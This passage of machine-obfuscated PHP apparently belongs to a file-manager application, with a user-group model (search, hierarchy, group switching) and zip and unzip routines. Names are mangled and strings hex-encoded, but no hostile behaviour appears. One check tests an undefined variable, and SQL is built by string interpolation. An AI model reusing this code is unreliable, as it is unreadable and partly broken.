$ß¬û™¡Ş[494]); $¨¼ÛúÈü = Input::get($ß¬û™¡Ş[498], $ß¬û™¡Ş[7], $ß¬û™¡Ş[1903], $†¸Ä®ÉØ); $ëöª±Âˆ = Input::get($ß¬û™¡Ş[499], $ß¬û™¡Ş[7], $ß¬û™¡Ş[1990], array($ß¬û™¡Ş[1990], $ß¬û™¡Ş[493])); $ëöª±Âˆ = $¿• â¾[$ëöª±Âˆ]; $Çí©ƒ€ = $Çí©ƒ€ . "{$¨¼ÛúÈü}\x20{$ëöª±Âˆ}\54\x20\147\162\x6f\x75\x70\x49\x44\x20\x61\163\143"; return $this->order($Çí©ƒ€); } public function listChild($©¢œùÍ) { $í±˜ûÅ =& $_SERVER[çâ¥×ø³]; $³¤˜úê = $this->where(array($í±˜ûÅ[180] => $©¢œùÍ))->_makeOrder()->selectPage(200); $this->_listDataApply($³¤˜úê[$í±˜ûÅ[413]]); return $³¤˜úê; } public function listChildIds($Î¿ƒ³€É) { $’ªÑÍõ‡ =& $_SERVER[çâ¥×ø³]; if (is_string($¥ÄÊÕ·£)) { $Î¿ƒ³€É = explode($’ªÑÍõ‡[50], $Î¿ƒ³€É); } $ô¼ÖÁ›š = $this->where(array($’ªÑÍõ‡[1899] => array($’ªÑÍõ‡[7], $Î¿ƒ³€É)))->field($’ªÑÍõ‡[1991])->select(); if (!$ô¼ÖÁ›š) { return !1; } $ùíïšö = array(); foreach ($ô¼ÖÁ›š as $ÓßüÓöŞ) { $ùíïšö[] = "\x73\x65\x6c\145\143\164\40\147\x72\157\165\160\x49\x44\40\x66\162\x6f\155\x20\x60\147\162\x6f\165\160\140\x20\x77\150\x65\x72\145\x20\160\x61\162\145\156\x74\114\x65\166\x65\x6c\40\x6c\x69\153\x65\40\x27{$ÓßüÓöŞ[$’ªÑÍõ‡[553]]}{$ÓßüÓöŞ[$’ªÑÍõ‡[1899]]}\x2c\45\x27"; } $ùíïšö = implode($’ªÑÍõ‡[1992], $ùíïšö); $ô¼ÖÁ›š = $this->query($ùíïšö); if (!$ô¼ÖÁ›š) { return array(); } $Î¿ƒ³€É = array_to_keyvalue($ô¼ÖÁ›š, $’ªÑÍõ‡[12], $’ªÑÍõ‡[1899]); return array_unique($Î¿ƒ³€É); } public function listByID($¼õÈ«ö¼) { $Óáö¯ŒÎ =& $_SERVER[çâ¥×ø³]; if (!$¼õÈ«ö¼) { return array(); } $ÎóªÅ®ú = array($Óáö¯ŒÎ[1899] => array($Óáö¯ŒÎ[7], $¼õÈ«ö¼)); $Œ¼ù–ƒ‡ = $this->where($ÎóªÅ®ú)->select(); $Œ¼ù–ƒ‡ = array_sort_keep($Œ¼ù–ƒ‡, $Óáö¯ŒÎ[1899], $¼õÈ«ö¼); $this->_listDataApply($Œ¼ù–ƒ‡); return $Œ¼ù–ƒ‡; } public function listSearch($µÔ—ô×¸) { $ä·°‡ =& $_SERVER[çâ¥×ø³]; $ÜèÕûœ = $µÔ—ô×¸[$ä·°‡[1993]]; $õ™ˆÒûœ = isset($µÔ—ô×¸[$ä·°‡[1994]]) ? $µÔ—ô×¸[$ä·°‡[1994]] : !1; if (!trim($ÜèÕûœ)) { return !1; } $ÜèÕûœ = str_replace($ä·°‡[1995], $ä·°‡[1996], $ÜèÕûœ); $”Íøá… = array($ä·°‡[1899] => array($ä·°‡[427], "{$ÜèÕûœ}\x25"), $ä·°‡[32] => array($ä·°‡[427], "\x25{$ÜèÕûœ}\45"), $ä·°‡[1053] => $ä·°‡[1997]); if ($õ™ˆÒûœ) { $Ë…ıÉº— = $this->getInfoSimple($õ™ˆÒûœ); $øïô©¯Ì = $Ë…ıÉº—[$ä·°‡[553]] . $õ™ˆÒûœ . $ä·°‡[581]; $”Íøá… = array($”Íøá…, array($ä·°‡[553] => array($ä·°‡[427], $øïô©¯Ì))); } $”Íøá… = $this->parseWhereLike($”Íøá…); $ƒ÷­İŠ = $this->_makeOrder()->where($”Íøá…)->selectPage(20); $ƒ÷­İŠ = $ƒ÷­İŠ ? $ƒ÷­İŠ : array($ä·°‡[413] => array(), $ä·°‡[410] => array()); if (!$ƒ÷­İŠ || count($ƒ÷­İŠ[$ä·°‡[413]]) < 5 && Input::check($ÜèÕûœ, $ä·°‡[362])) { $„‹‡¾¯â = $this->groupChildrenAll($õ™ˆÒûœ); $Õ€ãÂôİ = $this->_searchFromMeta($ä·°‡[505], $ÜèÕûœ, 10, $„‹‡¾¯â); $¥âµåªí = $this->_searchFromMeta($ä·°‡[506], $ÜèÕûœ, 10, $„‹‡¾¯â); $¬ı£‘ĞŸ = array_merge($Õ€ãÂôİ, $¥âµåªí, $ƒ÷­İŠ[$ä·°‡[413]]); $ƒ÷­İŠ[$ä·°‡[413]] = array_unique_by_key($¬ı£‘ĞŸ, $ä·°‡[1899]); $ƒ÷­İŠ[$ä·°‡[410]][$ä·°‡[411]] = count($ƒ÷­İŠ[$ä·°‡[413]]); $ƒ÷­İŠ[$ä·°‡[410]][$ä·°‡[412]] = ceil($ƒ÷­İŠ[$ä·°‡[410]][$ä·°‡[411]] / $ƒ÷­İŠ[$ä·°‡[410]][$ä·°‡[407]]); } $this->_listDataApply($ƒ÷­İŠ[$ä·°‡[413]]); return $ƒ÷­İŠ; } protected function groupChildrenAll($ùıâß) { $òÇôŞ†© =& $_SERVER[çâ¥×ø³]; if (!$ùıâß) { return !1; } if (is_string($ùıâß)) { $ùıâß = array($ùıâß); } $Ã€Ğ®ù = $ùıâß; foreach ($ùıâß as $”ŒÑèõ‹) { $¥ìéÖ˜ = $this->getInfoSimple($”ŒÑèõ‹); $Ü²›¬¼ë = array($òÇôŞ†©[553] => array($òÇôŞ†©[427], $¥ìéÖ˜[$òÇôŞ†©[553]] . $”ŒÑèõ‹ . $òÇôŞ†©[581])); $î©â«ÔØ = $this->field($òÇôŞ†©[1899])->where($Ü²›¬¼ë)->select(); $Ã€Ğ®ù = array_merge($Ã€Ğ®ù, array_to_keyvalue($î©â«ÔØ, $òÇôŞ†©[12], $òÇôŞ†©[1899])); } return array_unique($Ã€Ğ®ù); } private function _searchFromMeta($À“·¦´È, $ëø¾¹¶, $ÜôÁ±üÓ, $àùğ³‚â) { $Ë†±ºâÑ =& $_SERVER[çâ¥×ø³]; $ëø¾¹¶ = strtolower($ëø¾¹¶); $•ê˜á = array($Ë†±ºâÑ[94] => $À“·¦´È, $Ë†±ºâÑ[418] => array($Ë†±ºâÑ[427], "\x25{$ëø¾¹¶}\45")); $•ê˜á = $this->parseWhereLike($•ê˜á); if ($àùğ³‚â) { $•ê˜á[$Ë†±ºâÑ[1899]] = array($Ë†±ºâÑ[7], $àùğ³‚â); } $ÀÎÆ×’ = Model($Ë†±ºâÑ[1998])->where($•ê˜á)->limit($ÜôÁ±üÓ)->select(); if (!$ÀÎÆ×’) { return array(); } $ÀÎÆ×’ = array_to_keyvalue($ÀÎÆ×’, $Ë†±ºâÑ[12], $Ë†±ºâÑ[1899]); $ºõêç×„ = $this->where(array($Ë†±ºâÑ[1987] => array($Ë†±ºâÑ[7], $ÀÎÆ×’)))->select(); if (!$ºõêç×„) { return array(); } return $ºõêç×„; } protected function _listDataApplyItem($‚êÍœĞå) { $öÇö½ŒÚ = array($‚êÍœĞå); $this->_listDataApply($öÇö½ŒÚ); return $öÇö½ŒÚ[0]; } protected function _listDataApply(&$´¦ıóÇ¬) { $Ê¸É¦Ì‘ =& $_SERVER[çâ¥×ø³]; if (!$´¦ıóÇ¬) { return; } $¬Ø·êÉã = array_to_keyvalue($´¦ıóÇ¬, $Ê¸É¦Ì‘[12], $Ê¸É¦Ì‘[1899]); $this->_listAppendChildren($´¦ıóÇ¬); $this->_listAppendChildrenMember($´¦ıóÇ¬); $this->_listAppendMeta($´¦ıóÇ¬, $¬Ø·êÉã); $this->_listAppendParent($´¦ıóÇ¬); $this->_listAppendSourceRoot($´¦ıóÇ¬, $¬Ø·êÉã); } private function _listAppendChildren(&$’‚®ƒÓ›) { $‡µ»Ü®š =& $_SERVER[çâ¥×ø³]; $›²ıÌ÷‡ = array_to_keyvalue($’‚®ƒÓ›, $‡µ»Ü®š[12], $‡µ»Ü®š[1899]); $‡˜¸Î®Ò = array($‡µ»Ü®š[180] => array($‡µ»Ü®š[7], $›²ıÌ÷‡)); $×®”ÚŒŒ = array($‡µ»Ü®š[180], $‡µ»Ü®š[1999] => $‡µ»Ü®š[533]); $·ĞÈØ— = $this->field($×®”ÚŒŒ)->where($‡˜¸Î®Ò)->group($‡µ»Ü®š[180])->select(); $öø—æÂÌ = array_to_keyvalue($·ĞÈØ—, $‡µ»Ü®š[180], $‡µ»Ü®š[533]); foreach ($’‚®ƒÓ› as &$êõÎÂ†) { $×Áãá¾‚ = $êõÎÂ†[$‡µ»Ü®š[1899]]; $êõÎÂ†[$‡µ»Ü®š[2000]] = isset($öø—æÂÌ[$×Áãá¾‚]) ? intval($öø—æÂÌ[$×Áãá¾‚]) : !1; } unset($êõÎÂ†); } private function _listAppendChildrenMember(&$Èèß¼”Ú) { $í¯äÓ»ô =& $_SERVER[çâ¥×ø³]; $µÜÉ£ùË = array_to_keyvalue($Èèß¼”Ú, $í¯äÓ»ô[12], $í¯äÓ»ô[1899]); $ÌÜåË—ş = array($í¯äÓ»ô[1899] => array($í¯äÓ»ô[7], $µÜÉ£ùË)); $ù±ªÀÈ = array($í¯äÓ»ô[1899], $í¯äÓ»ô[1999] => $í¯äÓ»ô[533]); $ÌÕÈé = Model($í¯äÓ»ô[1989])->field($ù±ªÀÈ)->where($ÌÜåË—ş)->group($í¯äÓ»ô[1899])->select(); $¼ØÏ®£´ = array_to_keyvalue($ÌÕÈé, $í¯äÓ»ô[1899], $í¯äÓ»ô[533]); foreach ($Èèß¼”Ú as &$ˆ×Ûçè©) { $ˆ¬ÍÚïí = $ˆ×Ûçè©[$í¯äÓ»ô[1899]]; $ˆ×Ûçè©[$í¯äÓ»ô[2001]] = isset($¼ØÏ®£´[$ˆ¬ÍÚïí]) ? intval($¼ØÏ®£´[$ˆ¬ÍÚïí]) : !1; } unset($ˆ×Ûçè©); } private function _listAppendMeta(&$§¡§ÔÑä, $»ä×Ä¨¢) { $„˜‹¸» =& $_SERVER[çâ¥×ø³]; $ú¯õ«Şª = array($„˜‹¸»[1899] => array($„˜‹¸»[7], $»ä×Ä¨¢)); $¦ôáæÕ¸ = Model($„˜‹¸»[1988])->where($ú¯õ«Şª)->select(); $¦ôáæÕ¸ = array_to_keyvalue_group($¦ôáæÕ¸, $„˜‹¸»[1899]); foreach ($¦ôáæÕ¸ as &$›á¯€´ë) { $›á¯€´ë = array_to_keyvalue($›á¯€´ë, $„˜‹¸»[94], $„˜‹¸»[418]); } unset($›á¯€´ë); foreach ($§¡§ÔÑä as &$£ßëâñ) { $£ßëâñ[$„˜‹¸»[507]] = array(); if (isset($¦ôáæÕ¸[$£ßëâñ[$„˜‹¸»[1899]]])) { $£ßëâñ[$„˜‹¸»[507]] = $¦ôáæÕ¸[$£ßëâñ[$„˜‹¸»[1899]]]; } } unset($£ßëâñ); } protected function parentLevelArray($†¿®èÆ°) { $’¦ÆŸ¬Ã =& $_SERVER[çâ¥×ø³]; $†¿®èÆ° = explode($’¦ÆŸ¬Ã[50], trim($†¿®èÆ°, $’¦ÆŸ¬Ã[50])); $†¿®èÆ° = array_remove_value($†¿®èÆ°, $’¦ÆŸ¬Ã[212]); return $†¿®èÆ°; } protected function parentInGroup($ÜâôÒê­, $şŠù²¸ş) { $ŠÁ¨¢…¢ =& $_SERVER[çâ¥×ø³]; $•Ğ Î† = $this->getInfoSimple($ÜâôÒê­); if (!$•Ğ Î†) { return !0; } $’Îƒë•ì = $this->parentLevelArray($•Ğ Î†[$ŠÁ¨¢…¢[553]]); $’Îƒë•ì[] = $ÜâôÒê­; foreach ($’Îƒë•ì as $ÜâôÒê­) { if (in_array($ÜâôÒê­ . $ŠÁ¨¢…¢[12], $şŠù²¸ş)) { return !0; } } return !1; } private function _listAppendParent(&$Ä¹£ÒıÈ) { $±…ÙÆ—¢ =& $_SERVER[çâ¥×ø³]; $¦‘–¯Õ = array(); foreach ($Ä¹£ÒıÈ as &$’øƒÅÊ») { $¦‘–¯Õ[$’øƒÅÊ»[$±…ÙÆ—¢[1899]]] = $’øƒÅÊ»[$±…ÙÆ—¢[32]]; $¸ÔÈÇ«û = $this->parentLevelArray($’øƒÅÊ»[$±…ÙÆ—¢[553]]); foreach ($¸ÔÈÇ«û as $Ñ™ƒ€Âê) { if (!isset($¦‘–¯Õ[$Ñ™ƒ€Âê])) { $¦‘–¯Õ[$Ñ™ƒ€Âê] = 0; } } } unset($’øƒÅÊ»); foreach ($¦‘–¯Õ as $¹±¯¿»â => $»Ü“²˜º) { if ($»Ü“²˜º) { continue; } $ÃõÓ¦å´ = $this->getInfoSimple($¹±¯¿»â); $¦‘–¯Õ[$¹±¯¿»â] = $ÃõÓ¦å´[$±…ÙÆ—¢[32]]; } $•£†üè = $GLOBALS[$±…ÙÆ—¢[6]][$±…ÙÆ—¢[89]][$±…ÙÆ—¢[2002]]; if ($GLOBALS[$±…ÙÆ—¢[536]] == $±…ÙÆ—¢[88]) { $•£†üè = !1; } foreach ($Ä¹£ÒıÈ as &$’øƒÅÊ») { $¸ÔÈÇ«û = $this->parentLevelArray($’øƒÅÊ»[$±…ÙÆ—¢[553]]); $±ë»Ôığ = $±…ÙÆ—¢[12]; foreach ($¸ÔÈÇ«û as $¹±¯¿»â => $Ñ™ƒ€Âê) { if ($•£†üè && $¹±¯¿»â == 0) { continue; } $±ë»Ôığ .= $¦‘–¯Õ[$Ñ™ƒ€Âê] . $±…ÙÆ—¢[8]; } if ($¸ÔÈÇ«û) { $±ë»Ôığ .= $’øƒÅÊ»[$±…ÙÆ—¢[32]]; } $’øƒÅÊ»[$±…ÙÆ—¢[558]] = str_replace($±…ÙÆ—¢[561], $±…ÙÆ—¢[8], $±ë»Ôığ); } unset($’øƒÅÊ»); } private function _listAppendSourceRoot(&$ğéÌ”…Ù, $á¤Ú®éÚ) { $­ÍšÌƒ =& $_SERVER[çâ¥×ø³]; $¯¡ßï©Ù = Model($­ÍšÌƒ[874])->listSourceRoot(SourceModel::TYPE_GROUP, $á¤Ú®éÚ); $¯¡ßï©Ù = array_to_keyvalue($¯¡ßï©Ù, $­ÍšÌƒ[538]); $¯¡ßï©Ù = array_remove_key($¯¡ßï©Ù, $­ÍšÌƒ[538]); foreach ($ğéÌ”…Ù as &$²ºª¹ŠË) { $²ºª¹ŠË[$­ÍšÌƒ[87]] = $¯¡ßï©Ù[$²ºª¹ŠË[$­ÍšÌƒ[1899]]] ? $¯¡ßï©Ù[$²ºª¹ŠË[$­ÍšÌƒ[1899]]] : array(); } unset($²ºª¹ŠË); } protected function groupMerge($ÆÍÁ¯÷à) { $ÆÍÁ¯÷à = array_values(array_unique($ÆÍÁ¯÷à)); $—ßƒ£¸ß = array(); for ($Ôµˆ“¨´ = 0; $Ôµˆ“¨´ < count($ÆÍÁ¯÷à); $Ôµˆ“¨´++) { $ÓŒêÖäî = !1; for ($‘øÍ…’ = 0; $‘øÍ…’ < count($ÆÍÁ¯÷à); $‘øÍ…’++) { if ($Ôµˆ“¨´ == $‘øÍ…’) { continue; } if ($this->isParentOf($ÆÍÁ¯÷à[$‘øÍ…’], $ÆÍÁ¯÷à[$Ôµˆ“¨´])) { $ÓŒêÖäî = !0; break; } } if (!$ÓŒêÖäî) { $—ßƒ£¸ß[] = $ÆÍÁ¯÷à[$Ôµˆ“¨´]; } } return $—ßƒ£¸ß; } protected function isParentOf($§çŸû“, $ËÀø²è³) { $´£ëû¶ =& $_SERVER[çâ¥×ø³]; if (!$§çŸû“ || !$ËÀø²è³ || $§çŸû“ == $ËÀø²è³) { return !1; } $‡¾‰›’‰ = $this->getInfoSimple($§çŸû“); $İõ¨¾ô = $this->getInfoSimple($ËÀø²è³); $úöÌî‚ú = $‡¾‰›’‰[$´£ëû¶[553]] . $§çŸû“ . $´£ëû¶[50]; if (substr($İõ¨¾ô[$´£ëû¶[553]], 0, strlen($úöÌî‚ú)) == $úöÌî‚ú) { return !0; } return !1; } public function groupShowRoot($ÔîÓÄğö, $›„àßˆ– = false) { $ø·öí“ =& $_SERVER[çâ¥×ø³]; $Ğá¹Öí± = $this->getInfo($ÔîÓÄğö); if (!$Ğá¹Öí±) { return array(); } $ø‰êµÁ¿ = $this->parentLevelArray($Ğá¹Öí±[$ø·öí“[553]]); $°¤úØè¼ = array($ÔîÓÄğö); if (count($ø‰êµÁ¿) == 0) { return $°¤úØè¼; } if ($›„àßˆ– && count($ø‰êµÁ¿) == 1) { return $°¤úØè¼; } if (!$Ğá¹Öí±[$ø·öí“[507]] || !isset($Ğá¹Öí±[$ø·öí“[507]][$ø·öí“[1985]]) || $Ğá¹Öí±[$ø·öí“[507]][$ø·öí“[1985]] == $ø·öí“[1954]) { return $this->groupShowRoot($ø‰êµÁ¿[count($ø‰êµÁ¿) - 1], $›„àßˆ–); } if ($Ğá¹Öí±[$ø·öí“[507]][$ø·öí“[1985]] == $ø·öí“[401]) { $ëİÛ‚¼‡ = explode($ø·öí“[50], $Ğá¹Öí±[$ø·öí“[507]][$ø·öí“[1986]]); if ($ëİÛ‚¼‡) { $°¤úØè¼ = array_merge($°¤úØè¼, $ëİÛ‚¼‡); } } return $°¤úØè¼; } protected function resetParentLevel() { $ï€¸ó°Û =& $_SERVER[çâ¥×ø³]; $°š®î¹ = $ï€¸ó°Û[1899]; $í¤Şçªü = $this->select(); $í¤Şçªü = array_to_keyvalue($í¤Şçªü, $°š®î¹); foreach ($í¤Şçªü as $’á‘ùÛ) { $Ø¡º©ş¬ = $’á‘ùÛ; $øŸ™ô®’ = array(); while ($Ø¡º©ş¬[$ï€¸ó°Û[180]] != 0) { $øŸ™ô®’[] = $Ø¡º©ş¬[$ï€¸ó°Û[180]]; $Ø¡º©ş¬ = $í¤Şçªü[$Ø¡º©ş¬[$ï€¸ó°Û[180]]]; } $øŸ™ô®’[] = 0; $øŸ™ô®’ = $ï€¸ó°Û[50] . implode($ï€¸ó°Û[50], array_reverse($øŸ™ô®’)) . $ï€¸ó°Û[50]; $this->setNamePinyin($’á‘ùÛ[$°š®î¹], $’á‘ùÛ[$ï€¸ó°Û[32]]); $this->where(array($°š®î¹ => $’á‘ùÛ[$°š®î¹]))->save(array($ï€¸ó°Û[620] => $øŸ™ô®’)); } return $í¤Şçªü; } public function groupNameAuto($æÊõ¬µ, $ò–ªˆÔ’) { $ÊíØÓôÄ =& $_SERVER[çâ¥×ø³]; $æÓŠ®Ğ = $this->where(array($ÊíØÓôÄ[445] => $æÊõ¬µ))->getField($ÊíØÓôÄ[32], !0); if (!$æÓŠ®Ğ || !in_array($ò–ªˆÔ’, $æÓŠ®Ğ)) { return $ò–ªˆÔ’; } for ($ñïã½…Ë = 1; $ñïã½…Ë <= count($æÓŠ®Ğ) + 1; $ñïã½…Ë++) { $‘‘Šã˜Ş = $ò–ªˆÔ’ . "\x28{$ñïã½…Ë}\51"; if (!in_array($‘‘Šã˜Ş, $æÓŠ®Ğ)) { return $‘‘Šã˜Ş; } } } public function groupSwitch($ùİàçµë, $Åƒü—¥–) { $±ÍÓÚûü =& $_SERVER[çâ¥×ø³]; $¿ñŞ…„ï = array($±ÍÓÚûü[1899] => array($±ÍÓÚûü[7], array($ùİàçµë, $Åƒü—¥–))); $ãáÊ€ = $this->where($¿ñŞ…„ï)->select(); $ãáÊ€ = array_to_keyvalue($ãáÊ€, $±ÍÓÚûü[1899]); if (!isset($ãáÊ€[$ùİàçµë]) || !isset($ãáÊ€[$Åƒü—¥–]) || $ãáÊ€[$ùİàçµë][$±ÍÓÚûü[180]] == 0) { return !1; } $¿ñŞ…„ï = array($±ÍÓÚûü[1899] => $ùİàçµë); $”È¼¦—Ø = Model($±ÍÓÚûü[1989])->where($¿ñŞ…„ï)->select(); if (!$”È¼¦—Ø) { $”È¼¦—Ø = array(); } foreach ($”È¼¦—Ø as $–İØÏÎâ) { $ÍÂÛ»„é = $–İØÏÎâ[$±ÍÓÚûü[1701]]; $¿ñŞ…„ï = array($±ÍÓÚûü[1701] => $ÍÂÛ»„é, $±ÍÓÚûü[1899] => $Åƒü—¥–); $”œôñ “ = Model($±ÍÓÚûü[1989])->where($¿ñŞ…„ï)->find(); if (!$”œôñ “) { $”²ùÅ”÷ = array($Åƒü—¥– => $–İØÏÎâ[$±ÍÓÚûü[2003]]); Model($±ÍÓÚûü[567])->userGroupAdd($ÍÂÛ»„é, $”²ùÅ”÷); } Model($±ÍÓÚûü[567])->userGroupRemove($ÍÂÛ»„é, $ùİàçµë); } $¿ñŞ…„ï = array($±ÍÓÚûü[178] => 2, $±ÍÓÚûü[180] => 0, $±ÍÓÚûü[453] => 1, $±ÍÓÚûü[538] => array($±ÍÓÚûü[7], array($ùİàçµë, $Åƒü—¥–))); $¤ëÀˆôø = Model($±ÍÓÚûü[874])->where($¿ñŞ…„ï)->field($±ÍÓÚûü[2004])->select(); $¤ëÀˆôø = array_to_keyvalue($¤ëÀˆôø, $±ÍÓÚûü[538], $±ÍÓÚûü[181]); $áûñùÀ× = !empty($¤ëÀˆôø[$ùİàçµë]) ? $¤ëÀˆôø[$ùİàçµë] : !1; if ($áûñùÀ×) { if (!$¤ëÀˆôø[$Åƒü—¥–]) { $¤ëÀˆôø[$Åƒü—¥–] = Model($±ÍÓÚûü[874])->groupRootAdd($Åƒü—¥–); } $ë¶Šä¥ƒ = $¤ëÀˆôø[$Åƒü—¥–]; $¿ñŞ…„ï = array($±ÍÓÚûü[180] => $áûñùÀ×); $¤ëÀˆôø = Model($±ÍÓÚûü[874])->where($¿ñŞ…„ï)->field($±ÍÓÚûü[2005])->select(); if (!$¤ëÀˆôø) { $¤ëÀˆôø = array(); } Model($±ÍÓÚûü[874])->moveClearAuth = !1; foreach ($¤ëÀˆôø as $™Å¥ş¬è) { $‡íış = $™Å¥ş¬è[$±ÍÓÚûü[453]] == $±ÍÓÚûü[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($±ÍÓÚûü[874])->move($™Å¥ş¬è[$±ÍÓÚûü[181]], $ë¶Šä¥ƒ, $‡íış); } Model($±ÍÓÚûü[874])->moveClearAuth = !0; $¿ñŞ…„ï = array($±ÍÓÚûü[178] => 2, $±ÍÓÚûü[538] => $ùİàçµë); $ğß¥Ïñô = array($±ÍÓÚûü[538] => $Åƒü—¥–); Model($±ÍÓÚûü[2006])->where($¿ñŞ…„ï)->save($ğß¥Ïñô); Model($±ÍÓÚûü[2007])->where($¿ñŞ…„ï)->save($ğß¥Ïñô); } $this->_changeChildLevel($ãáÊ€[$ùİàçµë], $ãáÊ€[$Åƒü—¥–], !0); $this->where(array($±ÍÓÚûü[180] => $ùİàçµë))->save(array($±ÍÓÚûü[180] => $Åƒü—¥–)); $this->_clearChildrenCache($ãáÊ€[$Åƒü—¥–]); return !0; } } goto aê¤•ï§ƒ; F™¨Å½…Ç’: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $¸‰Œ±ê; if ($¸‰Œ±ê) { return $¸‰Œ±ê; } $È»¦™òÇ = IO::init($_SERVER[çâ¥×ø³][8]); return $È»¦™òÇ; } private static function iconvSystem($¨ëÍ˜™) { return self::local()->iconvSystem($¨ëÍ˜™); } private static function iconvApp($ß¬İï¸ı) { return self::local()->iconvApp($ß¬İï¸ı); } public static function zipFolder($‚½³ùŠÜ, $ŞÃá‰‰É = "\x7a\x69\x70", $ë²ïæ“¼ = '', $°ÊéİÀŒ = REPEAT_RENAME) { $şÄ÷³îÏ =& $_SERVER[çâ¥×ø³]; $¦ƒËÄ“ = IO::listPath($‚½³ùŠÜ); if (!$¦ƒËÄ“) { return !1; } $¦ƒËÄ“ = array_merge($¦ƒËÄ“[$şÄ÷³îÏ[82]], $¦ƒËÄ“[$şÄ÷³îÏ[83]]); return self::zip($¦ƒËÄ“, $ŞÃá‰‰É, $ë²ïæ“¼, $°ÊéİÀŒ); } public static function zip($èŸğÈ²ı, $ê…éİ³ = "\172\x69\x70", $•ºšèŒü = '', $±…‹Ù¡œ = REPEAT_RENAME) { $îçÇ¿êş =& $_SERVER[çâ¥×ø³]; if (is_string($èŸğÈ²ı) && $èŸğÈ²ı) { $èŸğÈ²ı = array(array($îçÇ¿êş[84] => $èŸğÈ²ı)); } $èÃóİ‹µ = self::init($èŸğÈ²ı[0][$îçÇ¿êş[84]]); $Îëæù— = self::info($èŸğÈ²ı[0][$îçÇ¿êş[84]]); $«†ñ±µ  = $îçÇ¿êş[12]; $ŠäŸ¾üñ = $îçÇ¿êş[12]; $±³ô›ïˆ = $îçÇ¿êş[12]; if ($•ºšèŒü && substr($•ºšèŒü, -1, 1) != $îçÇ¿êş[8]) { $ŠäŸ¾üñ = get_path_father($•ºšèŒü); $±³ô›ïˆ = get_path_this($•ºšèŒü); } else { $ŠäŸ¾üñ = self::pathFather($Îëæù—[$îçÇ¿êş[84]]); $±³ô›ïˆ = $Îëæù—[$îçÇ¿êş[32]] . $îçÇ¿êş[10] . $ê…éİ³; if (count($èŸğÈ²ı) > 1) { $Â‹ã¡”ü = IO::info($ŠäŸ¾üñ); $±³ô›ïˆ = $Â‹ã¡”ü[$îçÇ¿êş[32]] . $îçÇ¿êş[10] . $ê…éİ³; } if ($•ºšèŒü) { $ŠäŸ¾üñ = $•ºšèŒü; } } if ($èÃóİ‹µ->getType() == $îçÇ¿êş[106]) { $Ë±»«€ˆ = self::init($ŠäŸ¾üñ); $‚©÷©“° = $Ë±»«€ˆ->getType() == $îçÇ¿êş[106] ? $ŠäŸ¾üñ : get_path_father($èÃóİ‹µ->path); $‚©÷©“° = rtrim($‚©÷©“°, $îçÇ¿êş[8]) . $îçÇ¿êş[8]; mk_dir($‚©÷©“°); } else { $«†ñ±µ  = TEMP_FILES . $îçÇ¿êş[1236] . time() . rand_string(8) . $îçÇ¿êş[8]; mk_dir($«†ñ±µ ); file_put_contents($«†ñ±µ  . $îçÇ¿êş[1237], $îçÇ¿êş[12]); $‚©÷©“° = $«†ñ±µ ; } $çŒ›¸ş = IO::info($‚©÷©“°); if (!$çŒ›¸ş || !$çŒ›¸ş[$îçÇ¿êş[217]]) { show_json(LNG($îçÇ¿êş[1238]), !1); } $Û´˜Ÿ‡ä = self::zipFileList($èŸğÈ²ı, $«†ñ±µ ); foreach ($Û´˜Ÿ‡ä as $Ä‰–¼ü¶ => $²‘Â¤ô) { $Û´˜Ÿ‡ä[$Ä‰–¼ü¶] = self::iconvSystem($²‘Â¤ô); } $¬…Ã¡²Ä = get_filename_auto($‚©÷©“° . $±³ô›ïˆ, $îçÇ¿êş[12], $±…‹Ù¡œ); KodArchive::create(self::iconvSystem($¬…Ã¡²Ä), $Û´˜Ÿ‡ä); if (!IO::exist($¬…Ã¡²Ä)) { if ($«†ñ±µ ) { del_dir($«†ñ±µ ); } show_json(LNG($îçÇ¿êş[1239]), !1); } if (!$«†ñ±µ ) { return $¬…Ã¡²Ä; } $áÌü¢–  = self::move($¬…Ã¡²Ä, $ŠäŸ¾üñ, $±…‹Ù¡œ); if ($«†ñ±µ ) { del_dir($«†ñ±µ ); } if (!$¬…Ã¡²Ä) { show_json(LNG($îçÇ¿êş[1239]), !1); } return $áÌü¢– ; } public static function unzip($ŸŸÜ¶É, $úî–ì, $ÜãÇğªõ = "\x2d\x31", $Œ™şß©š = "\162\145\x70\x6c\141\143\x65") { $±üÌ“Ã =& $_SERVER[çâ¥×ø³]; $Üî–¼Ğ = parent::info($ŸŸÜ¶É); if (!$Üî–¼Ğ) { show_json(LNG($±üÌ“Ã[1240]), !1); } $”ÇşŠ€é = IO::infoFullSimple($úî–ì); if (!$”ÇşŠ€é) { $úî–ì = IO::mkdir($úî–ì); } if (isset($”ÇşŠ€é[$±üÌ“Ã[181]]) && trim($”ÇşŠ€é[$±üÌ“Ã[84]], $±üÌ“Ã[8]) != trim($úî–ì, $±üÌ“Ã[8])) { $Óó‘‘Ù = KodIO::make($”ÇşŠ€é[$±üÌ“Ã[180]]); $ÕÂ‚ı¥ = IO::fileNameAuto($Óó‘‘Ù, $”ÇşŠ€é[$±üÌ“Ã[32]], REPEAT_RENAME_FOLDER, !0); $úî–ì = IO::mkdir($Óó‘‘Ù . $ÕÂ‚ı¥); } $ÜãÇğªõ = $ÜãÇğªõ && $ÜãÇğªõ != $±üÌ“Ã[1241] ? @json_decode($ÜãÇğªõ, !0) : -1; $åÃŒï¿ = self::unzipPart($ŸŸÜ¶É, $ÜãÇğªõ); if (!$åÃŒï¿ || !IO::exist($åÃŒï¿[$±üÌ“Ã[214]])) { show_json(LNG($±üÌ“Ã[105]), !1); } $‚ìŠÁú² = $åÃŒï¿[$±üÌ“Ã[1242]][count($åÃŒï¿[$±üÌ“Ã[1242]]) - 1]; if ($‚ìŠÁú²[$±üÌ“Ã[1243]] == -1 || substr($‚ìŠÁú²[$±üÌ“Ã[32]], -1, 1) == $±üÌ“Ã[8]) { $Åµù£ó = $åÃŒï¿[$±üÌ“Ã[1244]] . rand_string(10) . $±üÌ“Ã[8]; mk_dir($Åµù£ó); $Ã·¬Çí¼ = count($åÃŒï¿[$±üÌ“Ã[1242]]) == 1 ? IO::ext($ŸŸÜ¶É) : get_path_ext($åÃŒï¿[$±üÌ“Ã[214]]); $¨…æÍ‚æ = KodArchive::extract(self::iconvSystem($åÃŒï¿[$±üÌ“Ã[214]]), $Åµù£ó, $‚ìŠÁú²[$±üÌ“Ã[1243]], $ÕÂ‚ı¥, $Ã·¬Çí¼); self::unzipErrorCheck($¨…æÍ‚æ, array($±üÌ“Ã[1245], $ŸŸÜ¶É, $Ã·¬Çí¼, $úî–ì, $åÃŒï¿)); 